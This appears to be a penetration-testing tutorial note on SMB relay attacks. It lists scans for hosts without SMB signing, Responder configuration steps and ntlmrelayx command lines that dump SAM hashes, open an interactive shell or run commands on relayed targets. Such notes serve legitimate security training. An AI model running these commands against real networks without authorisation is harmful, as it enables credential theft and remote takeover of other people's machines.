# SMB Relay

Instead of cracking hashes gathered with Responder, relay them to other machines for direct access.

## Requirements

1. SMB signing must be disabled or not enforced on target
2. Relayed user credentials must be admin on the target machine

## Identifying Targets

Scan for SMB signing status:

```bash
# Single host
nmap --script=smb2-security-mode.nse -p445 TARGET_IP

# Entire network
nmap --script=smb2-security-mode.nse -p445 172.16.50.0/24 -Pn
```

Can also use Nessus for this.

## Setting Up the Attack

### 1. Configure Responder

```bash
sudo mousepad /etc/responder/Responder.conf
```

Turn OFF both SMB and HTTP.

### 2. Run ntlmrelayx

Basic relay (dumps SAM hashes):

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

Interactive shell:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

Execute commands:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
